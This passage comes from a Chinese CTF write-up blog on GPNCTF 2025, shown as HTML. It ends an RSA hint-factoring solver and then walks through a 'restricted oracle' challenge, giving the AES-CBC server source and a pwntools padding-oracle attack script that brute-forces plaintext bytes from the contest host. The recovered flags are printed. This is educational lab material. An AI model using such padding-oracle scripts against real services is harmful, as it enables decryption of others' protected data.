class="line">    n_ = p_*q_</span><br><span class="line">    nn_list = n_list[<span class="number">0</span>:l]</span><br><span class="line">    <span class="keyword">if</span> n_==n:</span><br><span class="line">        candidate.append(p_)</span><br><span class="line">    <span class="comment">#print(&#x27;--------&#x27;)</span></span><br><span class="line">    <span class="keyword">if</span>  Integer(n_).digits(base=<span class="number">7</span>)[<span class="number">0</span>:l] == nn_list:</span><br><span class="line">        <span class="keyword">if</span> l&gt;= <span class="built_in">len</span>(hint):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        h = hint[l]</span><br><span class="line">            </span><br><span class="line">        <span class="built_in">print</span>(Integer(n_).digits(base=<span class="number">7</span>))</span><br><span class="line">        <span class="keyword">if</span> h==<span class="number">0</span>:</span><br><span class="line">            s = search[<span class="built_in">int</span>(h)]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">                <span class="comment">#print(&#x27;sou&#x27;)</span></span><br><span class="line">                find(<span class="built_in">str</span>(i)+p,<span class="built_in">str</span>(s[i])+q)</span><br><span class="line">        <span class="keyword">if</span> h==<span class="number">1</span>:</span><br><span class="line">            s = search[<span class="built_in">int</span>(h)]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">                 <span class="comment">#print(&#x27;sou&#x27;)</span></span><br><span class="line">                 find(<span class="built_in">str</span>(i)+p,<span class="built_in">str</span>(s[i])+q)</span><br><span class="line">        <span class="keyword">if</span> h==<span class="number">2</span>:</span><br><span class="line">            s = search[<span class="built_in">int</span>(h)]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">                 <span class="comment">#print(&#x27;sou&#x27;)</span></span><br><span class="line">                 find(<span class="built_in">str</span>(i)+p,<span class="built_in">str</span>(s[i])+q)                </span><br><span class="line">        <span class="keyword">if</span> h==<span class="number">3</span>:</span><br><span class="line">            s = search[<span class="built_in">int</span>(h)]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">                 <span class="comment">#print(&#x27;sou&#x27;)</span></span><br><span class="line">                 find(<span class="built_in">str</span>(i)+p,<span class="built_in">str</span>(s[i])+q)</span><br><span class="line">        <span class="keyword">if</span> h==<span class="number">4</span>:</span><br><span class="line">            s = search[<span class="built_in">int</span>(h)]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">                 <span class="comment">#print(&#x27;sou&#x27;)</span></span><br><span class="line">                 find(<span class="built_in">str</span>(i)+p,<span class="built_in">str</span>(s[i])+q)</span><br><span class="line">        <span class="keyword">if</span> h==<span class="number">5</span>:</span><br><span class="line">            s = search[<span class="built_in">int</span>(h)]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">                 <span class="comment">#print(&#x27;sou&#x27;)</span></span><br><span class="line">                 find(<span class="built_in">str</span>(i)+p,<span class="built_in">str</span>(s[i])+q)                </span><br><span class="line">        <span class="keyword">if</span> h==<span class="number">6</span>:</span><br><span class="line">            s = search[<span class="built_in">int</span>(h)]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">                 <span class="comment">#print(&#x27;sou&#x27;)</span></span><br><span class="line">                 find(<span class="built_in">str</span>(i)+p,<span class="built_in">str</span>(s[i])+q)                   </span><br><span class="line"><span class="comment"># 0+1 = 1</span></span><br><span class="line"><span class="comment"># 1+0 = 1</span></span><br><span class="line"><span class="comment"># 6+2  5+3 4+4 3+5 2+6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    find(<span class="built_in">str</span>(i),<span class="built_in">str</span>(x1[i]))</span><br><span class="line"><span class="built_in">print</span>(candidate)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> candidate:</span><br><span class="line">    q = n//i</span><br><span class="line">    phi = (i-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    d = inverse_mod(e,phi)</span><br><span class="line">    m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">    <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># b&#x27;GPNCTF&#123;wOw_faCTORING_wi7H_H1NT5_15_FUn&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/09/05/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GPNCTF2025%E5%A4%8D%E7%8E%B0/image-20250716093455090.png" alt="image-20250716093455090"></p><h2 id="restricted-oracle">restricted oracle</h2><ul><li>从这题了解到了<code>CBC</code>块加密模式有一个攻击为<code>padding Oracle</code>攻击，稍微改了一下这题的代码，使得爆破次数没有限制，从而学习了一下<code>padding Oracle</code>攻击。基本版的<code>padding Oracle</code>攻击的学习过程写在了这篇博客中：<a href="https://iyheart.github.io/2025/06/18/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/%E5%9D%97%E5%8A%A0%E5%AF%86/%E5%9D%97%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F/">块加密工作模式 | iyheart的博客</a></li><li>题目附件如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">MAX_TRIES = <span class="keyword">lambda</span> x: <span class="built_in">len</span>(x)*<span class="number">40</span>  <span class="comment"># 严格限制了爆破的次数</span></span><br><span class="line">TEXT_FILE = <span class="string">&quot;text.txt&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getText</span>(<span class="params">n=<span class="number">10</span></span>)-&gt;<span class="built_in">str</span>:</span><br><span class="line">    lines = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(TEXT_FILE, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">    <span class="comment">#print(len(lines), &quot;lines loaded from text file.&quot;)</span></span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        line =secrets.choice(lines)</span><br><span class="line">        line =line.split(<span class="string">&quot; &quot;</span>,<span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">        out += line.strip()</span><br><span class="line">    <span class="comment">#out = &quot;abc&quot;*100 + &quot;bcd&quot;*100+&quot;A&quot;  # 题目给出了密文的形式,应该就是用于减少爆破次数的.</span></span><br><span class="line">    out = <span class="string">&quot;&quot;</span>.join(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x <span class="keyword">in</span> string.ascii_letters,out))</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PadServer</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,text</span>):</span><br><span class="line">        self.queries = [<span class="number">0</span>]</span><br><span class="line">        self.key =  os.urandom(<span class="number">16</span>)</span><br><span class="line">        self.cipher = AES.new(self.key, AES.MODE_CBC)</span><br><span class="line">        self.chall = text.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(random.randint(<span class="number">0</span>,<span class="number">4</span>)):</span><br><span class="line">                self.chall += <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>)+(os.urandom(<span class="number">1</span>)[<span class="number">0</span>] % <span class="number">26</span>)).encode()<span class="comment"># 明文 = getText(n) 的输出（仅包含英文字母）+ 0~4 个随机大写字母（来自 &#x27;A&#x27;-&#x27;Z&#x27;）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        self.iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">        <span class="comment">#print(f&quot;Padding is : &#123;self.pad(self.chall).hex()&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cutq</span>(<span class="params">self</span>):</span><br><span class="line">        self.queries+=[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_chall</span>(<span class="params">self</span>):</span><br><span class="line">        aes = AES.new(self.key, AES.MODE_CBC, self.iv)</span><br><span class="line">        <span class="keyword">return</span> self.iv+aes.encrypt(self.pad(self.chall))</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">self, s</span>):</span><br><span class="line">        padbit = <span class="number">16</span> - <span class="built_in">len</span>(s) % <span class="number">16</span></span><br><span class="line">        padding = <span class="built_in">bytes</span>([padbit] * padbit)</span><br><span class="line">        <span class="keyword">return</span> s + padding</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">unpad</span>(<span class="params">self, s</span>):</span><br><span class="line">        padbit = s[-<span class="number">1</span>]</span><br><span class="line">        padding = s[-padbit:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">set</span>(padding) == &#123;padbit&#125;:</span><br><span class="line">            <span class="keyword">return</span> s[:-s[-<span class="number">1</span>]]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, ciphertext</span>):</span><br><span class="line">        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)</span><br><span class="line">        plaintext = cipher.decrypt(ciphertext)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">self, ciphertext</span>):</span><br><span class="line">        self.queries[-<span class="number">1</span>] += <span class="number">1</span></span><br><span class="line">        plaintext = self.decrypt(ciphertext)</span><br><span class="line">        <span class="comment">#print(&quot;oracle request decrypts to &quot;, plaintext.hex())</span></span><br><span class="line">        <span class="keyword">if</span> self.unpad(plaintext) == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFlag</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read().strip()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a:<span class="built_in">bytes</span>,b:<span class="built_in">bytes</span></span>)-&gt;<span class="built_in">bytes</span>:</span><br><span class="line"></span><br><span class="line">    ml  = <span class="built_in">max</span>(<span class="built_in">len</span>(a),<span class="built_in">len</span>(b))</span><br><span class="line">    a = a.ljust(ml, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    b = b.ljust(ml, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Welcome to the Pad Server!&quot;</span>)</span><br><span class="line">    FLAG =getFlag()</span><br><span class="line">    text =getText()</span><br><span class="line">    oracle =PadServer(text)</span><br><span class="line">    MAX_TRIES = MAX_TRIES(text)</span><br><span class="line">    tries = <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(xor(sha512(text[:-<span class="number">3</span>].encode(<span class="string">&quot;utf-8&quot;</span>)).digest(),FLAG.encode()).<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(oracle.get_chall().<span class="built_in">hex</span>())</span><br><span class="line">    <span class="keyword">while</span> tries &lt; MAX_TRIES:</span><br><span class="line">        ciph = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&quot;speak to the oracle: &quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ciph) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Ciphertext must be a multiple of 16 bytes.&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Oracle says: &quot;</span>, oracle.oracle(ciph))</span><br><span class="line">        tries+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>首先需要接收消息，并从消息中分离数<code>vi</code>和<code>密文</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_bytes</span>(<span class="params">block</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(block))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(block)==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(block)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">padding</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([padding] * padding)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p =  remote(<span class="string">&quot;newford-of-charged-unity.gpn23.ctf.kitctf.de&quot;</span>, <span class="string">&quot;443&quot;</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Welcome to the Pad Server!\n&#x27;</span>)</span><br><span class="line">c1 = p.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line"><span class="built_in">print</span>(c1)</span><br><span class="line">iv_c2 = p.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line"><span class="built_in">print</span>(iv_c2)</span><br><span class="line">iv = iv_c2[:<span class="number">32</span>]</span><br><span class="line">c2 = iv_c2[<span class="number">32</span>:]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c2=&#x27;</span>,c2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;iv=&#x27;</span>,iv)</span><br><span class="line">l = <span class="built_in">len</span>(c2)</span><br><span class="line">ll = l//<span class="number">32</span></span><br><span class="line"><span class="built_in">print</span>(l)</span><br><span class="line"><span class="built_in">print</span>(l//<span class="number">32</span>)</span><br><span class="line">c_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ll):</span><br><span class="line">    c_list.append(c2[i*<span class="number">32</span>:i*<span class="number">32</span>+<span class="number">32</span>])</span><br><span class="line"><span class="built_in">print</span>(c_list)</span><br><span class="line"><span class="built_in">print</span>(my_bytes(c_list[-<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><ul><li>之后就是爆破出<code>padding</code>的个数</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">padding = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    block1 = my_bytes(c_list[-<span class="number">2</span>])</span><br><span class="line">    block2 = my_bytes(c_list[-<span class="number">1</span>])</span><br><span class="line">    payload = (block1[:i]+xor(block1[i],<span class="string">b&#x27;\x10&#x27;</span>)+block1[i+<span class="number">1</span>:]+block2).<span class="built_in">hex</span>().encode()</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;speak to the oracle:&#x27;</span>,payload)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Oracle says:  &#x27;</span>)</span><br><span class="line">    rec = p.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">    <span class="built_in">print</span>(rec)</span><br><span class="line">    <span class="keyword">if</span> rec==<span class="string">&#x27;False&#x27;</span>:</span><br><span class="line">        padding=<span class="number">0x10</span>-i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;padding----&gt;&quot;</span>,padding)</span><br></pre></td></tr></table></figure><p><img src="/2025/09/05/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GPNCTF2025%E5%A4%8D%E7%8E%B0/image-20250716100001976.png" alt="image-20250716100001976"></p><ul><li>尝试爆破最后一块剩余没有被<code>padding</code>填充的部分，会发现爆破出来的，字母目前只有大写字母和小写字母。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 破解尾块的数据</span></span><br><span class="line">text = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(padding,<span class="number">16</span>,<span class="number">1</span>):</span><br><span class="line">    t = j-padding</span><br><span class="line">    padd = pad(padding)</span><br><span class="line">    padd2 = pad(j + <span class="number">1</span>)[:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(padd2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;------------第<span class="subst">&#123;<span class="number">15</span>-j&#125;</span>位爆破--------------&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">        payload = (block1[:<span class="number">15</span>-j]+xor(block1[<span class="number">15</span>-j],i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>))+xor(xor(block1[<span class="number">16</span>-j:],text.encode()+padd),padd2)+block2).<span class="built_in">hex</span>().encode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;speak to the oracle:&#x27;</span>,payload)</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Oracle says:  &#x27;</span>)</span><br><span class="line">        rec = p.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">        <span class="built_in">print</span>(rec)</span><br><span class="line">        <span class="keyword">if</span> rec==<span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;find---&gt;&quot;</span>,xor(i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>),j+<span class="number">1</span>))</span><br><span class="line">            text = xor(i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>),j+<span class="number">1</span>).decode() + text</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;text---&gt;&quot;</span>,text)</span><br><span class="line">            sleep(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#out = &quot;abc&quot;*100 + &quot;bcd&quot;*100+&quot;A&quot;  # 题目给出了密文的形式,应该就是用于减少爆破次数的.</span></span><br></pre></td></tr></table></figure><p><img src="/2025/09/05/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GPNCTF2025%E5%A4%8D%E7%8E%B0/image-20250716095632989.png" alt="image-20250716095632989"></p><ul><li>但是由于有限制次数，而题目中又给了<code>key</code>是大小写字母，所以我们可以构造如下列表，用于减少爆破次数</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 建立一个列表,用于爆破使用,爆破只选择对应对应索引与字母的异或值,从而减少爆破次数</span></span><br><span class="line">latter = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">a = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">17</span>):</span><br><span class="line">    x = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> latter:</span><br><span class="line">        <span class="built_in">print</span>(j)</span><br><span class="line">        x.append(i^(<span class="built_in">ord</span>(j)))</span><br><span class="line">        <span class="comment">#print(x)</span></span><br><span class="line">    a.append(x)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>减少次数后就可以在有限次数绕过爆破出<code>key</code>，在爆破的时候还需要考虑一下时间问题，明文非常长，但是靶机只有<code>30</code>分钟的限制。但是在爆破的过程中会发现明文是德国新闻的一些句子。</li></ul><p><img src="/2025/09/05/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GPNCTF2025%E5%A4%8D%E7%8E%B0/image-20250716143239889.png" alt="image-20250716143239889"></p><ul><li>这就需要对单词进行词频分析，从而减少爆破的时间，并且还发现，每次连接发送过来的块长度不一样，有的块长度到达了<code>60</code>多，有的才<code>30</code>多或者<code>40</code>多，所以我们应该选择<code>40</code>多、<code>30</code>多块的来进行爆破，这样也能节省时间。这样能使得平均每块爆破时间降低到<code>38.07秒</code></li></ul><p><img src="/2025/09/05/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GPNCTF2025%E5%A4%8D%E7%8E%B0/image-20250716144442590.png" alt="image-20250716144442590"></p><ul><li>爆破出来<code>text</code>后再去掉最后的大写字母，即可得到结果</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a:<span class="built_in">bytes</span>,b:<span class="built_in">bytes</span></span>)-&gt;<span class="built_in">bytes</span>:</span><br><span class="line">    ml  = <span class="built_in">max</span>(<span class="built_in">len</span>(a),<span class="built_in">len</span>(b))</span><br><span class="line">    a = a.ljust(ml, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    b = b.ljust(ml, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(x ^^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b))</span><br><span class="line">    </span><br><span class="line">c1 = <span class="string">&#x27;wiederumhatbereitsweitereEntlassungenbeiWallStreetBankenundanderenFinanzinstitutionenzurFolgeEinwandererausDeutschlandsetzenflschlicherweiseeineLehremitdemgesellschaftlichenAbstieggleichHPIncwirdesdiesenMarktauchweiterhinadressierenerklrtderBritewarumausMcLarenSichtvielfreinMotorenUpdateinSpielbergsprichtkuriertderMinistereinenBeinbruchausundGtzeuernsichnichtBildNchstesBildDiesesBildmachtedasaustralischeMerinoschafChrisweltweitbekanntSeptemberseienalleDetailszuderAbschaltsoftwareoffengelegtwordenvergrernBildinfoausblendenBildWaserwartenSieindieserPhasevonIhrenSpielernWosinddennjetztallehindienochvoreinpaarJahren&#x27;</span></span><br><span class="line">c2 = <span class="string">&#x27;d620ed061b06427d260bda1af508da1517a84b5d93a9c466a65ca608a671bdffd941e829a0c923b69c9187dba50ffcdf81351c7f117503ba78b664b72643e626&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(c2))</span><br><span class="line"><span class="built_in">print</span>(xor(hashlib.sha512(c1[:-<span class="number">3</span>].encode(<span class="string">&quot;utf-8&quot;</span>)).digest(),<span class="built_in">bytes</span>.fromhex(c2)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(c1)//<span class="number">16</span>)</span><br><span class="line"><span class="string">b&#x27;GPNCTF&#123;nic3_Gu3SS1Ng_p4DdInG_iS_FuN&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="number">38</span></span><br></pre></td></tr></table></figure><p><img src="/2025/09/05/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GPNCTF2025%E5%A4%8D%E7%8E%B0/image-20250716161430730.png" alt="image-20250716161430730"></p><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 